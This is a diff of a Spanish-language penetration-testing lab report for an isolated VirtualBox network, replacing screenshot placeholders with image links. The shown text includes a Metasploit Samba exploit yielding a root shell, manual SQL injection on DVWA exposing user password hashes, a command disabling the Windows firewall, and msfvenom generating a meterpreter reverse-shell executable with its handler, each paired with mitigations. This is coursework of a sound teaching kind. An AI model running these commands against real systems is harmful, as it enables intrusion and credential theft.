@@ -33,7 +33,7 @@ Todas las VMs en la misma **NAT Network** de VirtualBox (`10.0.2.0/24`), aislada
 
 ```
                          NAT Network 10.0.2.0/24
-   ┌──────────────┐        ┌──────────────┐        ┌─────────────────────┐
+   ┌──────────────┐        ┌──────────────┐        ┌──────────────────────┐
    │  Kali Linux  │        │ Metasploitable2│      │    Windows 7         │
    │  (atacante)  │        │   (víctima)   │        │    (víctima)         │
    │  10.0.2.15   │        │   10.0.2.5    │        │    10.0.2.3          │
@@ -41,13 +41,14 @@ Todas las VMs en la misma **NAT Network** de VirtualBox (`10.0.2.0/24`), aislada
           │                       │                           │
           └───────────────────────┴───────────┬───────────────┘
                                                │
-                                   ┌───────────┬───────────┐
+                                   ┌───────────┴────────────┐
                                    │  Windows Server 2016   │
                                    │  (víctima)  10.0.2.6   │
                                    └────────────────────────┘
 ```
 
-📸 **Captura 0:** diagrama de red / confirmación de VMs en la misma NatNetwork (`nmap -sn 10.0.2.0/24` desde Kali).
+![Captura 0 — hosts en la NatNetwork](img/00-topologia-nmap-natnetwork.png)
+> **Captura 0:** descubrimiento de hosts con `nmap -sn 10.0.2.0/24` desde Kali — las VMs en la misma NAT Network.
 
 ## 🌐 Direccionamiento
 
@@ -76,7 +77,8 @@ nmap -sV -p 139,445 10.0.2.5
 445/tcp open  netbios-ssn  Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
 ```
 
-📸 **Captura 1:** salida de `nmap` mostrando el servicio Samba y su versión.
+![Captura 1 — footprinting Samba](img/p1-01-footprint-samba.png)
+> **Captura 1:** `nmap` mostrando el servicio Samba y su versión en el puerto 139/445.
 
 ### b. Carga y configuración del exploit
 
@@ -89,7 +91,8 @@ set LHOST 10.0.2.15
 show options
 ```
 
-📸 **Captura 2:** `show options` con `RHOSTS = 10.0.2.5`, `LHOST = 10.0.2.15` y el payload configurado.
+![Captura 2 — configuración del exploit](img/p1-02-exploit-options.png)
+> **Captura 2:** `show options` con `RHOSTS = 10.0.2.5`, `LHOST = 10.0.2.15` y el payload configurado.
 
 ### c. Explotación y demostración de la conexión remota
 
@@ -113,7 +116,8 @@ metasploitable
 Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
 ```
 
-📸 **Captura 3:** shell remoto mostrando `hostname` (metasploitable) y `uname -a` (versión del SO) — conexión como **root**.
+![Captura 3 — shell remoto como root](img/p1-03-shell-root.png)
+> **Captura 3:** shell remoto mostrando `hostname` (metasploitable) y `uname -a` (versión del SO) — acceso como **root**.
 
 > **Mitigación:** actualizar Samba a una versión parcheada (posterior a 3.0.25), deshabilitar la opción `username map script` si no se usa, restringir el acceso a los puertos 139/445 por firewall y aplicar el principio de mínimo privilegio en los servicios.
 
@@ -123,21 +127,24 @@ Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 G
 
 Escaneo tipo **Basic Network Scan** con Nessus Essentials a Metasploitable (`10.0.2.5`) y Windows 7 (`10.0.2.3`). Se documentan las vulnerabilidades **críticas** con su descripción y mitigación.
 
-📸 **Captura 4:** resumen del escaneo Nessus con el conteo de vulnerabilidades por severidad de ambos hosts.
+![Captura 4 — resumen del escaneo Nessus](img/p2-04-nessus-resumen.png)
+> **Captura 4:** vulnerabilidades detectadas por Nessus, ordenadas por severidad.
 
 ### Metasploitable (10.0.2.5) — VNC Server 'password' Password · CVSS 10.0
 
 - **a. Descripción:** el servidor VNC (puerto `5900/tcp`) está protegido con la contraseña débil `password`. Nessus logró autenticarse. Un atacante remoto **no autenticado** puede tomar **control total del escritorio** del sistema.
 - **b. Mitigación:** configurar una **contraseña robusta** en el servicio VNC (o deshabilitarlo si no se usa) y restringir el acceso por firewall a direcciones autorizadas.
 
-📸 **Captura 5:** detalle de la vulnerabilidad en Nessus (Description + Solution).
+![Captura 5 — VNC Server password (Nessus)](img/p2-05-vnc-password.png)
+> **Captura 5:** detalle en Nessus de la vulnerabilidad VNC 'password' (Description + Solution).
 
 ### Windows 7 (10.0.2.3) — Unsupported Windows OS · CVSS 10.0
 
 - **a. Descripción:** el equipo ejecuta **Windows 7 Home**, un sistema operativo **fuera de soporte (End of Life)**. Al no recibir actualizaciones de seguridad, acumula vulnerabilidades sin parchar de forma permanente.
 - **b. Mitigación:** migrar a un sistema operativo **soportado** (Windows 10/11). Si por obligación debe mantenerse, **aislarlo mediante segmentación de red**, sin acceso a internet, y aplicar controles compensatorios (firewall, EDR).
 
-📸 **Captura 6:** detalle de la vulnerabilidad en Nessus (Description + Solution).
+![Captura 6 — Unsupported Windows OS (Nessus)](img/p2-06-win7-unsupported.png)
+> **Captura 6:** detalle en Nessus de la vulnerabilidad Unsupported Windows OS (Description + Solution).
 
 > **Nota:** para que Nessus pudiera enumerar el Windows 7 se desactivó temporalmente el Firewall de Windows en la VM (`netsh advfirewall set allprofiles state off`), ya que por defecto bloqueaba los puertos y el escaneo salía incompleto.
 
@@ -154,7 +161,8 @@ Explotación **manual** (sin sqlmap) de la aplicación **DVWA** de Metasploitabl
 ```
 → Usuario MySQL: `root@localhost` · **Base de datos: `dvwa`**
 
-📸 **Captura 7:** resultado mostrando la base de datos `dvwa`.
+![Captura 7 — nombre de la base de datos](img/p3-07-database-dvwa.png)
+> **Captura 7:** la inyección revela la base de datos `dvwa` y el usuario `root@localhost`.
 
 ### a. Listado de usuarios de la base de datos y c. Hashes de contraseña
 
@@ -170,7 +178,8 @@ Explotación **manual** (sin sqlmap) de la aplicación **DVWA** de Metasploitabl
 | pablo | `0d107d09f5bbe40cade3de5c71e9e9b7` |
 | smithy | `5f4dcc3b5aa765d61d8327deb882cf99` |
 
-📸 **Captura 8:** listado de usuarios con sus hashes (puntos a y c).
+![Captura 8 — usuarios y hashes de la BD](img/p3-08-usuarios-hashes.png)
+> **Captura 8:** listado de usuarios de la base de datos con sus hashes MD5 (puntos a y c).
 
 **Enumeración adicional** (evidencia de alcance de la inyección):
 
@@ -202,7 +211,8 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=4444 -f exe -o
 
 Se transfirió al Windows 7 mediante un servidor HTTP temporal en Kali (`python3 -m http.server 8080`).
 
-📸 **Captura 9:** salida de `msfvenom` generando `malware.exe`.
+![Captura 9 — generación del malware con msfvenom](img/p4-09-msfvenom.png)
+> **Captura 9:** `msfvenom` genera `malware.exe` (73802 bytes).
 
 **Handler** en Kali para recibir la conexión:
 ```
@@ -218,14 +228,16 @@ run
 
 **b.1 — Procesos generados por el malware:** en *Running processes*, el proceso `malware.exe` (**PID 700**, ruta `c:\users\abraham\desktop\malware.exe`). Nota: el ejecutable se **camufla** con metadatos de *ApacheBench (ab.exe)*, pero SysInspector lo marca como riesgoso.
 
-📸 **Captura 10:** SysInspector → Running processes → `malware.exe`.
+![Captura 10 — proceso del malware en SysInspector](img/p4-10-sysinspector-proceso.png)
+> **Captura 10:** SysInspector → Running processes → `malware.exe` (b.1).
 
 **b.2 — Conexiones de red generadas por el malware:** en *Network Connections → TCP Connections*, la conexión **ESTABLISHED**:
 ```
 malware.exe   10.0.2.3:49178  →  10.0.2.15:4444   ESTAB
 ```
 
-📸 **Captura 11:** SysInspector → TCP Connections → conexión del malware hacia el atacante.
+![Captura 11 — conexión del malware en SysInspector](img/p4-11-sysinspector-conexion.png)
+> **Captura 11:** SysInspector → TCP Connections → conexión del malware hacia el atacante (b.2).
 
 > **Mitigación:** antivirus/EDR actualizado con protección en tiempo real, no ejecutar binarios de origen desconocido, monitoreo de **conexiones salientes anómalas** (un proceso de usuario conectándose a un host externo en un puerto alto es patrón típico de *reverse shell*), y segmentación de red con egress filtering.
 
@@ -239,14 +251,16 @@ Instalación de **Microsoft Baseline Security Analyzer 2.3** en el Windows Serve
 
 Resultado del escaneo (chequeos administrativos locales): Password Expiration, Automatic Updates, Incomplete Updates, Windows Firewall, Local Account Password Test, File System, entre otros.
 
-📸 **Captura 12:** reporte de MBSA con el listado de vulnerabilidades.
+![Captura 12 — reporte de MBSA](img/p5-12-mbsa-reporte.png)
+> **Captura 12:** reporte de MBSA con el listado de vulnerabilidades administrativas.
 
 ### b. Vulnerabilidad de riesgo alto — Password Expiration
 
 - **Descripción:** las **3 cuentas** de usuario del servidor (`Administrador`, `DefaultAccount`, `Invitado`) tienen contraseñas que **nunca expiran**. Al no forzar el cambio periódico, una contraseña comprometida sigue siendo válida de forma indefinida, ampliando la ventana de ataque.
 - **Método de mitigación:** configurar una **directiva de expiración de contraseñas** vía *Directiva de grupo (GPO)* o *Directiva de seguridad local* → **Directivas de cuenta → Directiva de contraseñas → Vigencia máxima de la contraseña** (ej. 60–90 días), forzando la rotación periódica. Complementar con longitud y complejidad mínimas e historial de contraseñas.
 
-📸 **Captura 13:** detalle de la vulnerabilidad Password Expiration (Result Details + How to correct this).
+![Captura 13 — detalle Password Expiration (MBSA)](img/p5-13-mbsa-password-expiration.png)
+> **Captura 13:** las 3 cuentas (Administrador, DefaultAccount, Invitado) con contraseña que no expira.
 
 ---
 
